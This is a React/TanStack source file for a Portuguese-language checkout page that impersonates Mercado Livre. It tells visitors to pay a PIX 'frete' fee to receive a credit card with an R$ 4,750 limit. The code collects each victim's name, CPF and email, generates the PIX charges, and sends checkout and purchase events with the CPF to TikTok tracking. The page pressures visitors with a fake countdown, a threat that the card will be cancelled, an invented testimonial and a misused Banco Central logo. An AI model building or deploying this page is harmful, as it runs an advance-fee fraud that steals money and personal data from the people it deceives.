import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useRef, useState } from "react";
import QRCode from "react-qr-code";
import bancoCentralLogo from "@/assets/banco-central.png";
import { FunnelSteps } from "@/components/FunnelSteps";
import { SiteFooter } from "@/components/SiteFooter";
import { createSigmaPix, getSigmaPaymentStatus } from "@/lib/sigma.functions";
import { trackTikTok } from "@/lib/tiktok";

export const Route = createFileRoute("/pagamento")({
  head: () => ({
    meta: [
      { title: "Finalize o envio - Mercado Livre" },
      { name: "description", content: "Pague o frete para receber seu cartão." },
    ],
  }),
  component: Pagamento,
});

type MetodoKey = "sedex" | "loggi" | "pac";

const METODOS: Record<
  MetodoKey,
  { nome: string; valorCents: number; valorLabel: string; productLink: string }
> = {
  sedex: { nome: "SEDEX", valorCents: 2990, valorLabel: "R$ 29,90", productLink: "phegWIAK" },
  loggi: { nome: "Loggi", valorCents: 3167, valorLabel: "R$ 31,67", productLink: "JWkaTFkp" },
  pac:   { nome: "PAC",   valorCents: 2430, valorLabel: "R$ 24,30", productLink: "HeuIpgqE" },
};

const FAQ = [
  { q: "Como funciona o cartão virtual?", a: "O cartão virtual funciona como um cartão físico, mas é disponibilizado imediatamente após o pagamento. Você pode usar para compras online e apps." },
  { q: "Por que eu preciso pagar o frete?", a: "O frete é necessário para o envio seguro do seu cartão físico. Este valor cobre os custos de postagem e seguro." },
  { q: "O que acontece depois que eu pagar o frete?", a: "Após o pagamento, seu cartão virtual será ativado imediatamente e o cartão físico será enviado para o endereço cadastrado." },
  { q: "E se eu pagar o frete e o cartão não chegar?", a: "Todos os envios são rastreados e segurados. Em caso de problema, entre em contato conosco para resolução imediata." },
  { q: "E se eu não pagar o frete agora?", a: "Esta oferta é válida apenas hoje. Caso não efetue o pagamento dentro do prazo, o cartão será cancelado." },
  { q: "Já paguei o frete. Preciso fazer mais alguma coisa?", a: "Não! Após o pagamento, seu cartão virtual será ativado automaticamente e você receberá todas as informações por email." },
];

function Pagamento() {
  const navigate = useNavigate();
  const criarPix = useServerFn(createSigmaPix);
  const checarStatus = useServerFn(getSigmaPaymentStatus);

  const [nome, setNome] = useState("TITULAR DO CARTÃO");
  const [cardColor, setCardColor] = useState("#3483FA");
  const [cpf, setCpf] = useState("");
  const [email, setEmail] = useState("");
  const [metodoKey, setMetodoKey] = useState<MetodoKey>("sedex");
  const [seconds, setSeconds] = useState(10 * 60);
  const [open, setOpen] = useState<number | null>(null);

  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");
  const [pix, setPix] = useState<{ key: string; txId: string } | null>(null);
  const [copied, setCopied] = useState(false);
  const pollRef = useRef<number | null>(null);

  const metodo = METODOS[metodoKey];

  useEffect(() => {
    if (typeof window === "undefined") return;
    const sp = new URLSearchParams(window.location.search);
    const n = sp.get("nome") || sessionStorage.getItem("nomeTitular") || "";
    if (n) setNome(n.toUpperCase());
    const m = sp.get("metodo");
    if (m && (m === "sedex" || m === "loggi" || m === "pac")) setMetodoKey(m);
    const c = sessionStorage.getItem("cpfTitular") || "";
    if (c) setCpf(c);
    const col = sessionStorage.getItem("cardColor");
    if (col) setCardColor(col);
  }, []);

  // InitiateCheckout — dispara quando a página carrega com método/valor definidos
  useEffect(() => {
    if (typeof window === "undefined") return;
    const emailLs = sessionStorage.getItem("emailTitular") || undefined;
    trackTikTok("InitiateCheckout", {
      value: metodo.valorCents / 100,
      currency: "BRL",
      content_id: metodo.productLink,
      content_name: `Frete ${metodo.nome}`,
      email: emailLs,
      external_id: cpf || undefined,
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [metodoKey]);

  useEffect(() => {
    const t = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, []);

  // polling status quando tem PIX gerado
  useEffect(() => {
    if (!pix) return;
    const tick = async () => {
      const r = await checarStatus({ data: { transactionId: pix.txId } });
      if (r.ok && r.paid) {
        if (pollRef.current) window.clearInterval(pollRef.current);
        trackTikTok("Purchase", {
          value: metodo.valorCents / 100,
          currency: "BRL",
          content_id: metodo.productLink,
          content_name: `Frete ${metodo.nome}`,
          email: email || undefined,
          external_id: cpf || undefined,
        });
        navigate({ to: "/aprovado" });
      }
    };
    pollRef.current = window.setInterval(tick, 3000) as unknown as number;
    return () => {
      if (pollRef.current) window.clearInterval(pollRef.current);
    };
  }, [pix, checarStatus, navigate]);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  const handlePagar = async () => {
    setErr("");
    const nomeLimpo = nome.trim();
    const emailLimpo = email.trim();
    const cpfDigits = cpf.replace(/\D/g, "");
    if (nomeLimpo.length < 3 || nomeLimpo === "TITULAR DO CARTÃO") {
      setErr("Nome do titular inválido. Volte e refaça a validação.");
      return;
    }
    if (cpfDigits.length !== 11) {
      setErr("CPF não encontrado. Volte e refaça a validação.");
      return;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailLimpo)) {
      setErr("Informe um e-mail válido para receber a confirmação.");
      return;
    }
    setLoading(true);
    try {
      const r = await criarPix({
        data: {
          productLink: metodo.productLink,
          paymentValue: metodo.valorCents,
          name: nomeLimpo,
          email: emailLimpo,
          document: cpfDigits,
        },
      });
      if (!r.ok) {
        setErr(r.error);
      } else {
        setPix({ key: r.pixKey, txId: r.transactionId });
      }
    } catch (e) {
      console.error(e);
      setErr("Erro ao gerar pagamento. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  const copiar = async () => {
    if (!pix) return;
    try {
      await navigator.clipboard.writeText(pix.key);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // ignore
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <FunnelSteps current={5} />

      <main className="flex-1 flex items-start justify-center px-4 py-6">
        <div className="w-full max-w-md bg-white rounded-xl shadow-sm p-6 md:p-8">
          <div className="text-center mb-2">
            <div className="text-sm font-semibold text-gray-700">Seu Limite Disponível</div>
            <div className="text-3xl font-bold text-gray-900 mt-1">R$ 4.750</div>
          </div>

          <div
            className="mt-5 mb-6 rounded-2xl p-5 shadow-lg aspect-[1.6] flex flex-col justify-between"
            style={{
              backgroundColor: cardColor,
              backgroundImage:
                "radial-gradient(circle at 72% 18%, rgba(255,255,255,.14), transparent 34%), linear-gradient(145deg, rgba(255,255,255,.10), rgba(0,0,0,.20))",
              color: cardColor === "#FFE600" ? "#1f2937" : "#ffffff",
            }}
          >
            <div className="w-10 h-7 rounded bg-[#FFD700]/90 shadow-inner" />
            <div className="text-lg font-semibold tracking-[0.2em]">4532 •••• •••• ••••</div>
            <div className="flex justify-between text-xs">
              <div>
                <div className="opacity-70 tracking-wider">TITULAR</div>
                <div className="font-semibold text-sm tracking-wide truncate max-w-[180px]">{nome}</div>
              </div>
              <div className="text-right">
                <div className="opacity-70 tracking-wider">VALIDADE</div>
                <div className="font-semibold text-sm">12/28</div>
              </div>
            </div>
          </div>

          <h1 className="text-xl font-bold text-gray-800 mb-1">Finalize o envio do seu cartão</h1>
          <p className="text-sm text-gray-600 mb-4">
            Pague o frete ({metodo.nome}) para receber o cartão físico e ativar o cartão virtual agora mesmo.
          </p>

          <div className="text-center text-3xl font-bold text-gray-800 my-5">{metodo.valorLabel}</div>

          {!pix && (
            <>
              <label className="block text-sm font-semibold text-gray-700 mb-1" htmlFor="email">
                Seu e-mail para confirmação
              </label>
              <input
                id="email"
                type="email"
                inputMode="email"
                autoComplete="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="seuemail@exemplo.com"
                className="w-full border border-gray-300 rounded-lg px-3 py-3 text-sm mb-3 focus:outline-none focus:border-[#2A68C8]"
                disabled={loading}
              />

              {err && (
                <div className="mb-3 text-sm text-red-600 bg-red-50 border border-red-200 rounded-lg p-3">
                  {err}
                </div>
              )}

              <button
                onClick={handlePagar}
                disabled={loading}
                className="w-full bg-[#2A68C8] hover:bg-[#1E5BBA] disabled:opacity-60 text-white font-bold py-4 rounded-lg shadow-md transition-colors"
              >
                {loading ? "Gerando..." : "Pagar Frete"}
              </button>
              <div className="text-center text-xs text-gray-900 font-semibold mt-2 flex items-center justify-center gap-1">
                🔒 Pagamento 100% seguro
              </div>
            </>
          )}

          {pix && (
            <div className="border-2 border-[#FFE600] rounded-xl p-4 bg-[#FFFBE0]/40">
              <div className="text-center font-bold text-gray-800 mb-3">
                Escaneie o QR Code para pagar
              </div>
              <div className="bg-white p-3 rounded-lg flex justify-center mb-3">
                <QRCode value={pix.key} size={200} />
              </div>
              <div className="text-xs text-gray-600 mb-1">PIX Copia e Cola:</div>
              <div className="bg-white border border-gray-200 rounded p-2 text-[10px] break-all font-mono text-gray-700 max-h-24 overflow-auto">
                {pix.key}
              </div>
              <button
                onClick={copiar}
                className="w-full mt-3 bg-[#2A68C8] hover:bg-[#1E5BBA] text-white font-bold py-3 rounded-lg transition-colors"
              >
                {copied ? "✓ Copiado!" : "Copiar código PIX"}
              </button>
              <div className="flex items-center justify-center gap-2 mt-3 text-xs text-gray-700">
                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                Aguardando confirmação do pagamento...
              </div>
              <div className="mt-4 pt-3 border-t border-gray-200 flex flex-col items-center gap-1">
                <img src={bancoCentralLogo} alt="Banco Central do Brasil" className="h-6 object-contain" />
                <div className="text-[10px] text-gray-500 text-center">Pagamento processado via PIX — sistema regulado pelo Banco Central do Brasil</div>
              </div>
            </div>
          )}

          <dl className="mt-6 space-y-2 text-sm">
            <div className="flex justify-between py-2 border-b border-gray-100">
              <dt className="font-semibold text-gray-700">Método de Envio</dt>
              <dd className="text-gray-600">{metodo.nome}</dd>
            </div>
            <div className="flex justify-between py-2 border-b border-gray-100">
              <dt className="font-semibold text-gray-700">Valor do Frete</dt>
              <dd className="text-gray-600">{metodo.valorLabel}</dd>
            </div>
          </dl>

          <div className="mt-5 rounded-lg border border-gray-200 p-4">
            <div className="font-bold text-gray-800 text-sm">Pagamento em Até 10 Minutos</div>
            <div className="text-xs text-gray-600 mt-1">
              Realize o pagamento do frete em até 10 minutos para ativar o cartão virtual.
            </div>
          </div>

          <div className="mt-3 rounded-lg border border-gray-200 p-4">
            <div className="font-bold text-gray-800 text-sm">Ativação Após Pagamento</div>
            <div className="text-xs text-gray-600 mt-1">
              O cartão virtual será ativado automaticamente após a aprovação do pagamento.
            </div>
          </div>

          <div className="mt-6 rounded-xl bg-gradient-to-r from-[#FFF7CC] to-[#FFE600]/40 border border-[#FFE600] p-4 text-center">
            <div className="text-xs font-semibold text-gray-700 uppercase tracking-wider">Oferta expira em</div>
            <div className="text-3xl font-bold text-[#E53935] tabular-nums my-1">{mm}:{ss}</div>
            <div className="text-xs text-gray-700">Pague hoje para garantir seu cartão</div>
          </div>

          <h2 className="font-bold text-gray-800 mt-8 mb-3">Perguntas Frequentes</h2>
          <div className="space-y-2">
            {FAQ.map((item, i) => (
              <div key={i} className="border border-gray-200 rounded-lg overflow-hidden">
                <button
                  onClick={() => setOpen(open === i ? null : i)}
                  className="w-full flex items-center justify-between px-4 py-3 text-left text-sm font-semibold text-gray-800 hover:bg-gray-50"
                >
                  {item.q}
                  <span className={`transition-transform text-gray-400 ${open === i ? "rotate-180" : ""}`}>▼</span>
                </button>
                {open === i && <div className="px-4 pb-4 text-sm text-gray-600">{item.a}</div>}
              </div>
            ))}
          </div>

          <div className="mt-6 flex items-center gap-3 p-3 bg-[#EAF2FE] rounded-lg">
            <div className="w-9 h-9 rounded-full bg-[#FFE600] flex items-center justify-center text-gray-900 font-bold shrink-0">✓</div>
            <div className="text-sm">
              <div className="font-semibold text-gray-800">Ana Silva</div>
              <div className="text-xs text-gray-600">Recebeu seu cartão hoje · há 2 minutos</div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
